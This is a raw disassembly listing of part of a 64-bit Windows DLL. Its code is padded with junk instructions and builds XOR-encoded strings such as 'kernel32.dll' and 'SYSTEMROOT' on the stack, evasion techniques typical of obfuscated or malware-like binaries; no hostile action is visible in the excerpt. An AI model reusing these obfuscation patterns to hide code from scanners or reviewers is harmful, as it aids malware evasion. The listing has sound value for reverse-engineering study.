   180004126:	57                   	push   %rdi
   180004127:	48 87 f6             	xchg   %rsi,%rsi
   18000412a:	5f                   	pop    %rdi
   18000412b:	e8 d0 d7 ff ff       	call   0x180001900
   180004130:	52                   	push   %rdx
   180004131:	4d 8d 1b             	lea    (%r11),%r11
   180004134:	5a                   	pop    %rdx
   180004135:	52                   	push   %rdx
   180004136:	41 53                	push   %r11
   180004138:	41 5b                	pop    %r11
   18000413a:	5a                   	pop    %rdx
   18000413b:	e8 10 dc ff ff       	call   0x180001d50
   180004140:	b9 75 02 00 00       	mov    $0x275,%ecx
   180004145:	e8 c6 d4 ff ff       	call   0x180001610
   18000414a:	90                   	nop
   18000414b:	90                   	nop
   18000414c:	e8 6f d2 ff ff       	call   0x1800013c0
   180004151:	ff 15 99 00 02 00    	call   *0x20099(%rip)        # 0x1800241f0
   180004157:	89 c6                	mov    %eax,%esi
   180004159:	ff 15 69 01 02 00    	call   *0x20169(%rip)        # 0x1800242c8
   18000415f:	31 f0                	xor    %esi,%eax
   180004161:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004165:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004169:	52                   	push   %rdx
   18000416a:	57                   	push   %rdi
   18000416b:	5f                   	pop    %rdi
   18000416c:	5a                   	pop    %rdx
   18000416d:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   180004172:	ff 15 c8 01 02 00    	call   *0x201c8(%rip)        # 0x180024340
   180004178:	4d 87 db             	xchg   %r11,%r11
   18000417b:	4d 89 ed             	mov    %r13,%r13
   18000417e:	48 8d 09             	lea    (%rcx),%rcx
   180004181:	4d 89 d2             	mov    %r10,%r10
   180004184:	41 50                	push   %r8
   180004186:	41 58                	pop    %r8
   180004188:	c7 44 24 2c 06 00 00 	movl   $0x6,0x2c(%rsp)
   18000418f:	00 
   180004190:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004194:	83 f0 6d             	xor    $0x6d,%eax
   180004197:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   18000419c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041a0:	83 f0 63             	xor    $0x63,%eax
   1800041a3:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   1800041a8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041ac:	83 f0 74             	xor    $0x74,%eax
   1800041af:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   1800041b4:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041b8:	83 f0 68             	xor    $0x68,%eax
   1800041bb:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   1800041c0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041c4:	83 f0 63             	xor    $0x63,%eax
   1800041c7:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   1800041cc:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041d0:	83 f0 6a             	xor    $0x6a,%eax
   1800041d3:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   1800041d8:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041dc:	83 f0 35             	xor    $0x35,%eax
   1800041df:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   1800041e4:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041e8:	83 f0 34             	xor    $0x34,%eax
   1800041eb:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1800041f0:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800041f4:	83 f0 28             	xor    $0x28,%eax
   1800041f7:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800041fc:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004200:	83 f0 62             	xor    $0x62,%eax
   180004203:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180004208:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000420c:	83 f0 6a             	xor    $0x6a,%eax
   18000420f:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180004214:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004218:	83 f0 6a             	xor    $0x6a,%eax
   18000421b:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180004220:	66 c7 44 24 48 00 00 	movw   $0x0,0x48(%rsp)
   180004227:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000422c:	ff 15 2e 00 02 00    	call   *0x2002e(%rip)        # 0x180024260
   180004232:	4d 8d 3f             	lea    (%r15),%r15
   180004235:	4d 87 e4             	xchg   %r12,%r12
   180004238:	90                   	nop
   180004239:	c7 44 24 2c 36 00 00 	movl   $0x36,0x2c(%rsp)
   180004240:	00 
   180004241:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004245:	83 f0 75             	xor    $0x75,%eax
   180004248:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   18000424d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004251:	83 f0 0c             	xor    $0xc,%eax
   180004254:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180004259:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000425d:	83 f0 6a             	xor    $0x6a,%eax
   180004260:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180004265:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004269:	83 f0 61             	xor    $0x61,%eax
   18000426c:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180004271:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004275:	83 f0 5f             	xor    $0x5f,%eax
   180004278:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   18000427d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004281:	83 f0 58             	xor    $0x58,%eax
   180004284:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180004289:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000428d:	83 f0 52             	xor    $0x52,%eax
   180004290:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180004295:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004299:	83 f0 59             	xor    $0x59,%eax
   18000429c:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   1800042a1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042a5:	83 f0 41             	xor    $0x41,%eax
   1800042a8:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800042ad:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042b1:	83 f0 45             	xor    $0x45,%eax
   1800042b4:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800042b9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042bd:	83 f0 6a             	xor    $0x6a,%eax
   1800042c0:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800042c5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042c9:	83 f0 65             	xor    $0x65,%eax
   1800042cc:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800042d1:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042d5:	83 f0 4f             	xor    $0x4f,%eax
   1800042d8:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800042dd:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042e1:	83 f0 45             	xor    $0x45,%eax
   1800042e4:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   1800042e9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042ed:	83 f0 42             	xor    $0x42,%eax
   1800042f0:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   1800042f5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800042f9:	83 f0 53             	xor    $0x53,%eax
   1800042fc:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   180004301:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004305:	83 f0 5b             	xor    $0x5b,%eax
   180004308:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000430d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004311:	83 f0 05             	xor    $0x5,%eax
   180004314:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180004319:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000431d:	83 f0 04             	xor    $0x4,%eax
   180004320:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180004325:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004329:	83 f0 6a             	xor    $0x6a,%eax
   18000432c:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180004331:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004335:	83 f0 5d             	xor    $0x5d,%eax
   180004338:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   18000433d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004341:	83 f0 53             	xor    $0x53,%eax
   180004344:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   180004349:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000434d:	83 f0 44             	xor    $0x44,%eax
   180004350:	66 89 44 24 5c       	mov    %ax,0x5c(%rsp)
   180004355:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004359:	83 f0 58             	xor    $0x58,%eax
   18000435c:	66 89 44 24 5e       	mov    %ax,0x5e(%rsp)
   180004361:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004365:	83 f0 53             	xor    $0x53,%eax
   180004368:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   18000436d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004371:	83 f0 5a             	xor    $0x5a,%eax
   180004374:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   180004379:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000437d:	83 f0 05             	xor    $0x5,%eax
   180004380:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180004385:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004389:	83 f0 04             	xor    $0x4,%eax
   18000438c:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180004391:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004395:	83 f0 18             	xor    $0x18,%eax
   180004398:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   18000439d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800043a1:	83 f0 52             	xor    $0x52,%eax
   1800043a4:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   1800043a9:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800043ad:	83 f0 5a             	xor    $0x5a,%eax
   1800043b0:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   1800043b5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800043b9:	83 f0 5a             	xor    $0x5a,%eax
   1800043bc:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   1800043c1:	66 c7 44 24 70 00 00 	movw   $0x0,0x70(%rsp)
   1800043c8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800043cd:	ff 15 3d fe 01 00    	call   *0x1fe3d(%rip)        # 0x180024210
   1800043d3:	c7 44 24 30 5b a3 12 	movl   $0x12a35b,0x30(%rsp)
   1800043da:	00 
   1800043db:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800043df:	41 51                	push   %r9
   1800043e1:	48 87 db             	xchg   %rbx,%rbx
   1800043e4:	41 59                	pop    %r9
   1800043e6:	48 87 ed             	xchg   %rbp,%rbp
   1800043e9:	48 89 f6             	mov    %rsi,%rsi
   1800043ec:	48 8d 09             	lea    (%rcx),%rcx
   1800043ef:	e8 dc da ff ff       	call   0x180001ed0
   1800043f4:	4d 89 db             	mov    %r11,%r11
   1800043f7:	4d 8d 1b             	lea    (%r11),%r11
   1800043fa:	b8 01 00 00 00       	mov    $0x1,%eax
   1800043ff:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   180004406:	5e                   	pop    %rsi
   180004407:	c3                   	ret
   180004408:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000440f:	00 
   180004410:	48 83 ec 28          	sub    $0x28,%rsp
   180004414:	b9 dc 02 00 00       	mov    $0x2dc,%ecx
   180004419:	e8 12 cf ff ff       	call   0x180001330
   18000441e:	41 52                	push   %r10
   180004420:	41 53                	push   %r11
   180004422:	41 5b                	pop    %r11
   180004424:	41 5a                	pop    %r10
   180004426:	ff 15 b4 fe 01 00    	call   *0x1feb4(%rip)        # 0x1800242e0
   18000442c:	ff 15 f6 fd 01 00    	call   *0x1fdf6(%rip)        # 0x180024228
   180004432:	48 8d 12             	lea    (%rdx),%rdx
   180004435:	e8 06 d2 ff ff       	call   0x180001640
   18000443a:	c7 44 24 20 fc 57 44 	movl   $0x4457fc,0x20(%rsp)
   180004441:	00 
   180004442:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180004446:	41 52                	push   %r10
   180004448:	4d 89 c9             	mov    %r9,%r9
   18000444b:	41 5a                	pop    %r10
   18000444d:	41 51                	push   %r9
   18000444f:	48 8d 1b             	lea    (%rbx),%rbx
   180004452:	4d 89 d2             	mov    %r10,%r10
   180004455:	41 59                	pop    %r9
   180004457:	4d 89 c0             	mov    %r8,%r8
   18000445a:	4d 89 f6             	mov    %r14,%r14
   18000445d:	48 8d 36             	lea    (%rsi),%rsi
   180004460:	48 89 c0             	mov    %rax,%rax
   180004463:	57                   	push   %rdi
   180004464:	48 87 e4             	xchg   %rsp,%rsp
   180004467:	5f                   	pop    %rdi
   180004468:	b9 c4 01 00 00       	mov    $0x1c4,%ecx
   18000446d:	e8 de d6 ff ff       	call   0x180001b50
   180004472:	48 87 ed             	xchg   %rbp,%rbp
   180004475:	4d 89 c9             	mov    %r9,%r9
   180004478:	e8 83 d3 ff ff       	call   0x180001800
   18000447d:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180004482:	31 c9                	xor    %ecx,%ecx
   180004484:	31 d2                	xor    %edx,%edx
   180004486:	ff 15 cc fd 01 00    	call   *0x1fdcc(%rip)        # 0x180024258
   18000448c:	31 c9                	xor    %ecx,%ecx
   18000448e:	ff 15 d4 fc 01 00    	call   *0x1fcd4(%rip)        # 0x180024168
   180004494:	83 f8 ff             	cmp    $0xffffffff,%eax
   180004497:	74 08                	je     0x1800044a1
   180004499:	89 c1                	mov    %eax,%ecx
   18000449b:	ff 15 cf fc 01 00    	call   *0x1fccf(%rip)        # 0x180024170
   1800044a1:	48 89 d2             	mov    %rdx,%rdx
   1800044a4:	48 89 db             	mov    %rbx,%rbx
   1800044a7:	48 8d 3f             	lea    (%rdi),%rdi
   1800044aa:	4d 8d 12             	lea    (%r10),%r10
   1800044ad:	e8 1e da ff ff       	call   0x180001ed0
   1800044b2:	c7 44 24 20 53 fb 73 	movl   $0x73fb53,0x20(%rsp)
   1800044b9:	00 
   1800044ba:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800044be:	4d 89 db             	mov    %r11,%r11
   1800044c1:	ff 15 29 fd 01 00    	call   *0x1fd29(%rip)        # 0x1800241f0
   1800044c7:	90                   	nop
   1800044c8:	48 83 c4 28          	add    $0x28,%rsp
   1800044cc:	c3                   	ret
   1800044cd:	0f 1f 00             	nopl   (%rax)
   1800044d0:	48 81 ec 48 02 00 00 	sub    $0x248,%rsp
   1800044d7:	b9 07 02 00 00       	mov    $0x207,%ecx
   1800044dc:	e8 8f db ff ff       	call   0x180002070
   1800044e1:	48 87 f6             	xchg   %rsi,%rsi
   1800044e4:	90                   	nop
   1800044e5:	41 50                	push   %r8
   1800044e7:	41 54                	push   %r12
   1800044e9:	41 5c                	pop    %r12
   1800044eb:	41 58                	pop    %r8
   1800044ed:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1800044f2:	ff 15 98 fd 01 00    	call   *0x1fd98(%rip)        # 0x180024290
   1800044f8:	4d 8d 12             	lea    (%r10),%r10
   1800044fb:	48 89 d2             	mov    %rdx,%rdx
   1800044fe:	48 8d 1b             	lea    (%rbx),%rbx
   180004501:	4d 87 e4             	xchg   %r12,%r12
   180004504:	ff 15 de fc 01 00    	call   *0x1fcde(%rip)        # 0x1800241e8
   18000450a:	48 89 f6             	mov    %rsi,%rsi
   18000450d:	48 8d 09             	lea    (%rcx),%rcx
   180004510:	48 87 d2             	xchg   %rdx,%rdx
   180004513:	ba 00 10 00 00       	mov    $0x1000,%edx
   180004518:	31 c9                	xor    %ecx,%ecx
   18000451a:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180004520:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180004526:	ff 15 dc fe 01 00    	call   *0x1fedc(%rip)        # 0x180024408
   18000452c:	48 85 c0             	test   %rax,%rax
   18000452f:	74 11                	je     0x180004542
   180004531:	48 89 c1             	mov    %rax,%rcx
   180004534:	31 d2                	xor    %edx,%edx
   180004536:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   18000453c:	ff 15 ce fe 01 00    	call   *0x1fece(%rip)        # 0x180024410
   180004542:	90                   	nop
   180004543:	48 87 e4             	xchg   %rsp,%rsp
   180004546:	90                   	nop
   180004547:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   18000454c:	ff 15 3e fd 01 00    	call   *0x1fd3e(%rip)        # 0x180024290
   180004552:	4d 8d 09             	lea    (%r9),%r9
   180004555:	4d 8d 36             	lea    (%r14),%r14
   180004558:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000455c:	55                   	push   %rbp
   18000455d:	41 53                	push   %r11
   18000455f:	41 5b                	pop    %r11
   180004561:	5d                   	pop    %rbp
   180004562:	c7 44 24 40 65 b6 75 	movl   $0x75b665,0x40(%rsp)
   180004569:	00 
   18000456a:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000456e:	50                   	push   %rax
   18000456f:	4d 89 c0             	mov    %r8,%r8
   180004572:	58                   	pop    %rax
   180004573:	4d 89 ed             	mov    %r13,%r13
   180004576:	48 89 e4             	mov    %rsp,%rsp
   180004579:	53                   	push   %rbx
   18000457a:	41 57                	push   %r15
   18000457c:	41 5f                	pop    %r15
   18000457e:	5b                   	pop    %rbx
   18000457f:	b9 d6 02 00 00       	mov    $0x2d6,%ecx
   180004584:	e8 c7 da ff ff       	call   0x180002050
   180004589:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000458e:	31 c9                	xor    %ecx,%ecx
   180004590:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180004596:	ff 15 ac fc 01 00    	call   *0x1fcac(%rip)        # 0x180024248
   18000459c:	4d 89 c9             	mov    %r9,%r9
   18000459f:	4d 8d 3f             	lea    (%r15),%r15
   1800045a2:	4d 87 f6             	xchg   %r14,%r14
   1800045a5:	48 89 e4             	mov    %rsp,%rsp
   1800045a8:	48 89 ed             	mov    %rbp,%rbp
   1800045ab:	4d 8d 3f             	lea    (%r15),%r15
   1800045ae:	4d 89 d2             	mov    %r10,%r10
   1800045b1:	90                   	nop
   1800045b2:	48 89 ff             	mov    %rdi,%rdi
   1800045b5:	48 8d 00             	lea    (%rax),%rax
   1800045b8:	90                   	nop
   1800045b9:	4d 89 db             	mov    %r11,%r11
   1800045bc:	48 89 d2             	mov    %rdx,%rdx
   1800045bf:	48 8d 09             	lea    (%rcx),%rcx
   1800045c2:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800045c7:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800045cc:	ff 15 fe fb 01 00    	call   *0x1fbfe(%rip)        # 0x1800241d0
   1800045d2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800045d7:	ba 04 01 00 00       	mov    $0x104,%edx
   1800045dc:	ff 15 06 fd 01 00    	call   *0x1fd06(%rip)        # 0x1800242e8
   1800045e2:	57                   	push   %rdi
   1800045e3:	41 53                	push   %r11
   1800045e5:	41 5b                	pop    %r11
   1800045e7:	5f                   	pop    %rdi
   1800045e8:	4d 87 c9             	xchg   %r9,%r9
   1800045eb:	c7 44 24 40 dc 77 8d 	movl   $0x8d77dc,0x40(%rsp)
   1800045f2:	00 
   1800045f3:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800045f7:	b9 cc 02 00 00       	mov    $0x2cc,%ecx
   1800045fc:	e8 0f dd ff ff       	call   0x180002310
   180004601:	41 51                	push   %r9
   180004603:	41 59                	pop    %r9
   180004605:	90                   	nop
   180004606:	48 89 f6             	mov    %rsi,%rsi
   180004609:	48 89 e4             	mov    %rsp,%rsp
   18000460c:	4d 89 db             	mov    %r11,%r11
   18000460f:	ff 15 db fb 01 00    	call   *0x1fbdb(%rip)        # 0x1800241f0
   180004615:	48 89 ed             	mov    %rbp,%rbp
   180004618:	4d 89 f6             	mov    %r14,%r14
   18000461b:	48 8d 36             	lea    (%rsi),%rsi
   18000461e:	4d 8d 3f             	lea    (%r15),%r15
   180004621:	c7 44 24 2c 54 00 00 	movl   $0x54,0x2c(%rsp)
   180004628:	00 
   180004629:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000462d:	83 f0 03             	xor    $0x3,%eax
   180004630:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180004635:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004639:	83 f0 1d             	xor    $0x1d,%eax
   18000463c:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180004641:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004645:	83 f0 1a             	xor    $0x1a,%eax
   180004648:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   18000464d:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004651:	83 f0 10             	xor    $0x10,%eax
   180004654:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180004659:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000465d:	83 f0 1d             	xor    $0x1d,%eax
   180004660:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180004665:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004669:	83 f0 06             	xor    $0x6,%eax
   18000466c:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180004671:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
   180004678:	48 8d 4c 24 32       	lea    0x32(%rsp),%rcx
   18000467d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180004682:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180004688:	ff 15 7a fb 01 00    	call   *0x1fb7a(%rip)        # 0x180024208
   18000468e:	4d 89 ff             	mov    %r15,%r15
   180004691:	c7 44 24 40 80 9e 3a 	movl   $0x3a9e80,0x40(%rsp)
   180004698:	00 
   180004699:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000469d:	4d 8d 09             	lea    (%r9),%r9
   1800046a0:	4d 87 db             	xchg   %r11,%r11
   1800046a3:	4d 8d 00             	lea    (%r8),%r8
   1800046a6:	48 8d 09             	lea    (%rcx),%rcx
   1800046a9:	4d 87 e4             	xchg   %r12,%r12
   1800046ac:	48 8d 00             	lea    (%rax),%rax
   1800046af:	4d 89 ff             	mov    %r15,%r15
   1800046b2:	90                   	nop
   1800046b3:	48 8d 00             	lea    (%rax),%rax
   1800046b6:	90                   	nop
   1800046b7:	e8 84 d2 ff ff       	call   0x180001940
   1800046bc:	48 87 ed             	xchg   %rbp,%rbp
   1800046bf:	4d 8d 1b             	lea    (%r11),%r11
   1800046c2:	48 89 c0             	mov    %rax,%rax
   1800046c5:	31 c0                	xor    %eax,%eax
   1800046c7:	48 81 c4 48 02 00 00 	add    $0x248,%rsp
   1800046ce:	c3                   	ret
   1800046cf:	90                   	nop
   1800046d0:	56                   	push   %rsi
   1800046d1:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   1800046d8:	c7 44 24 5c 51 00 00 	movl   $0x51,0x5c(%rsp)
   1800046df:	00 
   1800046e0:	90                   	nop
   1800046e1:	48 87 d2             	xchg   %rdx,%rdx
   1800046e4:	e8 d7 cc ff ff       	call   0x1800013c0
   1800046e9:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   1800046ed:	48 87 db             	xchg   %rbx,%rbx
   1800046f0:	90                   	nop
   1800046f1:	48 8d 12             	lea    (%rdx),%rdx
   1800046f4:	4d 89 ff             	mov    %r15,%r15
   1800046f7:	e8 04 d2 ff ff       	call   0x180001900
   1800046fc:	b9 af 01 00 00       	mov    $0x1af,%ecx
   180004701:	e8 8a d5 ff ff       	call   0x180001c90
   180004706:	c7 44 24 3c 21 00 00 	movl   $0x21,0x3c(%rsp)
   18000470d:	00 
   18000470e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004712:	83 f0 72             	xor    $0x72,%eax
   180004715:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   18000471a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000471e:	83 f0 78             	xor    $0x78,%eax
   180004721:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180004726:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000472a:	83 f0 72             	xor    $0x72,%eax
   18000472d:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180004732:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004736:	83 f0 75             	xor    $0x75,%eax
   180004739:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   18000473e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004742:	83 f0 64             	xor    $0x64,%eax
   180004745:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   18000474a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000474e:	83 f0 6c             	xor    $0x6c,%eax
   180004751:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180004756:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000475a:	83 f0 73             	xor    $0x73,%eax
   18000475d:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180004762:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004766:	83 f0 6e             	xor    $0x6e,%eax
   180004769:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   18000476e:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004772:	83 f0 6e             	xor    $0x6e,%eax
   180004775:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   18000477a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000477e:	83 f0 75             	xor    $0x75,%eax
   180004781:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180004786:	66 c7 44 24 54 00 00 	movw   $0x0,0x54(%rsp)
   18000478d:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180004792:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   180004797:	48 89 f2             	mov    %rsi,%rdx
   18000479a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800047a0:	ff 15 62 fa 01 00    	call   *0x1fa62(%rip)        # 0x180024208
   1800047a6:	90                   	nop
   1800047a7:	4d 8d 00             	lea    (%r8),%r8
   1800047aa:	90                   	nop
   1800047ab:	90                   	nop
   1800047ac:	e8 df d6 ff ff       	call   0x180001e90
   1800047b1:	ff 15 c9 fa 01 00    	call   *0x1fac9(%rip)        # 0x180024280
   1800047b7:	90                   	nop
   1800047b8:	4d 87 ff             	xchg   %r15,%r15
   1800047bb:	e8 40 d0 ff ff       	call   0x180001800
   1800047c0:	90                   	nop
   1800047c1:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800047c5:	90                   	nop
   1800047c6:	e8 35 d0 ff ff       	call   0x180001800
   1800047cb:	c7 44 24 60 ea fa f8 	movl   $0xf8faea,0x60(%rsp)
   1800047d2:	00 
   1800047d3:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800047d7:	41 50                	push   %r8
   1800047d9:	4d 89 e4             	mov    %r12,%r12
   1800047dc:	41 58                	pop    %r8
   1800047de:	90                   	nop
   1800047df:	4d 87 d2             	xchg   %r10,%r10
   1800047e2:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1800047e7:	e8 f4 d0 ff ff       	call   0x1800018e0
   1800047ec:	4d 87 db             	xchg   %r11,%r11
   1800047ef:	4d 87 ff             	xchg   %r15,%r15
   1800047f2:	4d 8d 36             	lea    (%r14),%r14
   1800047f5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800047fa:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180004801:	00 
   180004802:	4c 8d 05 93 c2 01 00 	lea    0x1c293(%rip),%r8        # 0x180020a9c
   180004809:	31 c9                	xor    %ecx,%ecx
   18000480b:	31 d2                	xor    %edx,%edx
   18000480d:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180004813:	ff 15 57 fb 01 00    	call   *0x1fb57(%rip)        # 0x180024370
   180004819:	41 53                	push   %r11
   18000481b:	41 5b                	pop    %r11
   18000481d:	ff 15 a5 f9 01 00    	call   *0x1f9a5(%rip)        # 0x1800241c8
   180004823:	c7 44 24 60 6f ff 0f 	movl   $0xfff6f,0x60(%rsp)
   18000482a:	00 
   18000482b:	8b 44 24 60          	mov    0x60(%rsp),%eax
   18000482f:	90                   	nop
   180004830:	90                   	nop
   180004831:	48 8d 3f             	lea    (%rdi),%rdi
   180004834:	48 8d 09             	lea    (%rcx),%rcx
   180004837:	48 8d 00             	lea    (%rax),%rax
   18000483a:	4d 89 c0             	mov    %r8,%r8
   18000483d:	48 87 c9             	xchg   %rcx,%rcx
   180004840:	4d 8d 09             	lea    (%r9),%r9
   180004843:	41 52                	push   %r10
   180004845:	41 5a                	pop    %r10
   180004847:	48 8d 12             	lea    (%rdx),%rdx
   18000484a:	90                   	nop
   18000484b:	4d 87 c0             	xchg   %r8,%r8
